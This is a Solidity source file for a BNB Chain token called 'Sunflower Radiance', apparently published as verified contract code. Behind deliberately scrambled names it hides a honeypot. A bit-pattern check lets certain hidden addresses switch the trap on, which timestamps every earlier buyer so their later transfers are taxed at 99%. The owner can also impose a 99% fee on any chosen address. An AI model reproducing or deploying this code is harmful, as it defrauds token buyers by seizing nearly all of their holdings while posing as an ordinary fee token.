/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SunflowerRadiance is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Sunflower Radiance ";
    string constant _symbol = "SunflowerRadiance";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private limitModeMaxFeeWalletLaunchedSwap;
    mapping(address => bool) private teamMinAutoBuy;
    mapping(address => bool) private burnTeamIsLaunched;
    mapping(address => bool) private tradingBuyMaxBurn;
    mapping(address => uint256) private maxLaunchedMarketingModeExemptSwap;
    mapping(uint256 => address) private tradingFeeTeamLiquidity;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private burnModeExemptIs = 0;
    uint256 private receiverWalletBotsTx = 7;

    //SELL FEES
    uint256 private teamLimitAutoLaunched = 0;
    uint256 private teamMaxModeMin = 7;

    uint256 private txBotsBuyExempt = receiverWalletBotsTx + burnModeExemptIs;
    uint256 private tradingWalletTeamIs = 100;

    address private limitFeeBuyLiquidityAutoReceiver = (msg.sender); // auto-liq address
    address private isModeLaunchedReceiver = (0x5c3E40ABfE915355B819E92FfFffc0E153f98d2F); // marketing address
    address private marketingBotsIsSwapTrading = DEAD;
    address private maxAutoTeamTradingIs = DEAD;
    address private minMarketingTxBotsAuto = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private teamExemptBurnLimitFeeIsMax;
    uint256 private isBotsReceiverAutoExemptWallet;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private marketingFeeLaunchedTrading;
    uint256 private sellLiquidityLimitWalletTxTrading;
    uint256 private feeBuyMaxExemptTrading;
    uint256 private limitReceiverAutoLiquidityWalletTeam;
    uint256 private swapExemptBurnWallet;

    bool private sellBotsIsMarketing = true;
    bool private tradingBuyMaxBurnMode = true;
    bool private exemptSellLaunchedTeam = true;
    bool private swapLimitBotsMaxFeeMinTeam = true;
    bool private maxSellModeWallet = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private receiverMaxTxAuto = _totalSupply / 1000; // 0.1%

    
    uint256 private walletExemptReceiverLaunchedBurn;
    bool private teamLiquiditySellIsLaunchedBuy;
    bool private txExemptMinTeamLimitFeeMode;
    bool private maxIsTeamExempt;
    bool private autoLimitFeeSwapSell;
    bool private limitIsLaunchedWallet;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        marketingFeeLaunchedTrading = true;

        limitModeMaxFeeWalletLaunchedSwap[msg.sender] = true;
        limitModeMaxFeeWalletLaunchedSwap[address(this)] = true;

        teamMinAutoBuy[msg.sender] = true;
        teamMinAutoBuy[0x0000000000000000000000000000000000000000] = true;
        teamMinAutoBuy[0x000000000000000000000000000000000000dEaD] = true;
        teamMinAutoBuy[address(this)] = true;

        burnTeamIsLaunched[msg.sender] = true;
        burnTeamIsLaunched[0x0000000000000000000000000000000000000000] = true;
        burnTeamIsLaunched[0x000000000000000000000000000000000000dEaD] = true;
        burnTeamIsLaunched[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return sellTeamMarketingBuy(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return sellTeamMarketingBuy(sender, recipient, amount);
    }

    function sellTeamMarketingBuy(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = launchedSwapWalletBots(sender) || launchedSwapWalletBots(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                limitMaxIsMinSellFeeLaunched();
            }
            if (!bLimitTxWalletValue) {
                isTeamFeeBuySellTx(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return autoMaxSellModeBuy(sender, recipient, amount);}

        if (!limitModeMaxFeeWalletLaunchedSwap[sender] && !limitModeMaxFeeWalletLaunchedSwap[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || burnTeamIsLaunched[sender] || burnTeamIsLaunched[recipient], "Max TX Limit has been triggered");

        if (txExemptReceiverModeTradingSell()) {receiverFeeBotsBuyLaunchedTeamSwap();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = receiverMinModeIsFeeExemptBurn(sender) ? walletTxIsTeam(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function autoMaxSellModeBuy(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function receiverMinModeIsFeeExemptBurn(address sender) internal view returns (bool) {
        return !teamMinAutoBuy[sender];
    }

    function walletAutoSellTradingMarketingLaunchedLiquidity(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            txBotsBuyExempt = teamMaxModeMin + teamLimitAutoLaunched;
            return buyLimitLiquidityTeamExemptMaxWallet(sender, txBotsBuyExempt);
        }
        if (!selling && sender == uniswapV2Pair) {
            txBotsBuyExempt = receiverWalletBotsTx + burnModeExemptIs;
            return txBotsBuyExempt;
        }
        return buyLimitLiquidityTeamExemptMaxWallet(sender, txBotsBuyExempt);
    }

    function walletTxIsTeam(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(walletAutoSellTradingMarketingLaunchedLiquidity(sender, receiver == uniswapV2Pair)).div(tradingWalletTeamIs);

        if (tradingBuyMaxBurn[sender] || tradingBuyMaxBurn[receiver]) {
            feeAmount = amount.mul(99).div(tradingWalletTeamIs);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function launchedSwapWalletBots(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function buyLimitLiquidityTeamExemptMaxWallet(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = maxLaunchedMarketingModeExemptSwap[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function isTeamFeeBuySellTx(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        tradingFeeTeamLiquidity[exemptLimitValue] = addr;
    }

    function limitMaxIsMinSellFeeLaunched() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (maxLaunchedMarketingModeExemptSwap[tradingFeeTeamLiquidity[i]] == 0) {
                    maxLaunchedMarketingModeExemptSwap[tradingFeeTeamLiquidity[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(isModeLaunchedReceiver).transfer(amountBNB * amountPercentage / 100);
    }

    function txExemptReceiverModeTradingSell() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    maxSellModeWallet &&
    _balances[address(this)] >= receiverMaxTxAuto;
    }

    function receiverFeeBotsBuyLaunchedTeamSwap() internal swapping {
        uint256 amountToLiquify = receiverMaxTxAuto.mul(burnModeExemptIs).div(txBotsBuyExempt).div(2);
        uint256 amountToSwap = receiverMaxTxAuto.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = txBotsBuyExempt.sub(burnModeExemptIs.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(burnModeExemptIs).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(receiverWalletBotsTx).div(totalETHFee);

        payable(isModeLaunchedReceiver).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                limitFeeBuyLiquidityAutoReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getSwapLimitBotsMaxFeeMinTeam() public view returns (bool) {
        if (swapLimitBotsMaxFeeMinTeam != exemptSellLaunchedTeam) {
            return exemptSellLaunchedTeam;
        }
        if (swapLimitBotsMaxFeeMinTeam == exemptSellLaunchedTeam) {
            return exemptSellLaunchedTeam;
        }
        if (swapLimitBotsMaxFeeMinTeam == sellBotsIsMarketing) {
            return sellBotsIsMarketing;
        }
        return swapLimitBotsMaxFeeMinTeam;
    }
    function setSwapLimitBotsMaxFeeMinTeam(bool a0) public onlyOwner {
        if (swapLimitBotsMaxFeeMinTeam != tradingBuyMaxBurnMode) {
            tradingBuyMaxBurnMode=a0;
        }
        if (swapLimitBotsMaxFeeMinTeam != sellBotsIsMarketing) {
            sellBotsIsMarketing=a0;
        }
        swapLimitBotsMaxFeeMinTeam=a0;
    }

    function getMaxAutoTeamTradingIs() public view returns (address) {
        if (maxAutoTeamTradingIs == maxAutoTeamTradingIs) {
            return maxAutoTeamTradingIs;
        }
        if (maxAutoTeamTradingIs == limitFeeBuyLiquidityAutoReceiver) {
            return limitFeeBuyLiquidityAutoReceiver;
        }
        return maxAutoTeamTradingIs;
    }
    function setMaxAutoTeamTradingIs(address a0) public onlyOwner {
        if (maxAutoTeamTradingIs == limitFeeBuyLiquidityAutoReceiver) {
            limitFeeBuyLiquidityAutoReceiver=a0;
        }
        if (maxAutoTeamTradingIs == marketingBotsIsSwapTrading) {
            marketingBotsIsSwapTrading=a0;
        }
        maxAutoTeamTradingIs=a0;
    }

    function getBurnTeamIsLaunched(address a0) public view returns (bool) {
            return burnTeamIsLaunched[a0];
    }
    function setBurnTeamIsLaunched(address a0,bool a1) public onlyOwner {
        if (burnTeamIsLaunched[a0] != teamMinAutoBuy[a0]) {
           teamMinAutoBuy[a0]=a1;
        }
        burnTeamIsLaunched[a0]=a1;
    }

    function getReceiverWalletBotsTx() public view returns (uint256) {
        if (receiverWalletBotsTx != burnModeExemptIs) {
            return burnModeExemptIs;
        }
        if (receiverWalletBotsTx != teamLimitAutoLaunched) {
            return teamLimitAutoLaunched;
        }
        return receiverWalletBotsTx;
    }
    function setReceiverWalletBotsTx(uint256 a0) public onlyOwner {
        receiverWalletBotsTx=a0;
    }

    function getTradingWalletTeamIs() public view returns (uint256) {
        if (tradingWalletTeamIs != receiverWalletBotsTx) {
            return receiverWalletBotsTx;
        }
        if (tradingWalletTeamIs != receiverMaxTxAuto) {
            return receiverMaxTxAuto;
        }
        if (tradingWalletTeamIs != receiverWalletBotsTx) {
            return receiverWalletBotsTx;
        }
        return tradingWalletTeamIs;
    }
    function setTradingWalletTeamIs(uint256 a0) public onlyOwner {
        if (tradingWalletTeamIs != teamLimitAutoLaunched) {
            teamLimitAutoLaunched=a0;
        }
        if (tradingWalletTeamIs == txBotsBuyExempt) {
            txBotsBuyExempt=a0;
        }
        tradingWalletTeamIs=a0;
    }

    function getTeamMinAutoBuy(address a0) public view returns (bool) {
            return teamMinAutoBuy[a0];
    }
    function setTeamMinAutoBuy(address a0,bool a1) public onlyOwner {
        if (a0 != limitFeeBuyLiquidityAutoReceiver) {
            maxSellModeWallet=a1;
        }
        if (a0 == isModeLaunchedReceiver) {
            swapLimitBotsMaxFeeMinTeam=a1;
        }
        teamMinAutoBuy[a0]=a1;
    }

    function getIsModeLaunchedReceiver() public view returns (address) {
        if (isModeLaunchedReceiver != minMarketingTxBotsAuto) {
            return minMarketingTxBotsAuto;
        }
        if (isModeLaunchedReceiver == marketingBotsIsSwapTrading) {
            return marketingBotsIsSwapTrading;
        }
        return isModeLaunchedReceiver;
    }
    function setIsModeLaunchedReceiver(address a0) public onlyOwner {
        isModeLaunchedReceiver=a0;
    }

    function getReceiverMaxTxAuto() public view returns (uint256) {
        if (receiverMaxTxAuto == tradingWalletTeamIs) {
            return tradingWalletTeamIs;
        }
        if (receiverMaxTxAuto != burnModeExemptIs) {
            return burnModeExemptIs;
        }
        return receiverMaxTxAuto;
    }
    function setReceiverMaxTxAuto(uint256 a0) public onlyOwner {
        if (receiverMaxTxAuto != tradingWalletTeamIs) {
            tradingWalletTeamIs=a0;
        }
        if (receiverMaxTxAuto == tradingWalletTeamIs) {
            tradingWalletTeamIs=a0;
        }
        if (receiverMaxTxAuto == receiverWalletBotsTx) {
            receiverWalletBotsTx=a0;
        }
        receiverMaxTxAuto=a0;
    }

    function getMaxSellModeWallet() public view returns (bool) {
        if (maxSellModeWallet != exemptSellLaunchedTeam) {
            return exemptSellLaunchedTeam;
        }
        if (maxSellModeWallet == swapLimitBotsMaxFeeMinTeam) {
            return swapLimitBotsMaxFeeMinTeam;
        }
        if (maxSellModeWallet != maxSellModeWallet) {
            return maxSellModeWallet;
        }
        return maxSellModeWallet;
    }
    function setMaxSellModeWallet(bool a0) public onlyOwner {
        if (maxSellModeWallet != tradingBuyMaxBurnMode) {
            tradingBuyMaxBurnMode=a0;
        }
        if (maxSellModeWallet == sellBotsIsMarketing) {
            sellBotsIsMarketing=a0;
        }
        maxSellModeWallet=a0;
    }

    function getTradingBuyMaxBurn(address a0) public view returns (bool) {
            return tradingBuyMaxBurn[a0];
    }
    function setTradingBuyMaxBurn(address a0,bool a1) public onlyOwner {
        if (a0 != isModeLaunchedReceiver) {
            swapLimitBotsMaxFeeMinTeam=a1;
        }
        if (tradingBuyMaxBurn[a0] != burnTeamIsLaunched[a0]) {
           burnTeamIsLaunched[a0]=a1;
        }
        tradingBuyMaxBurn[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}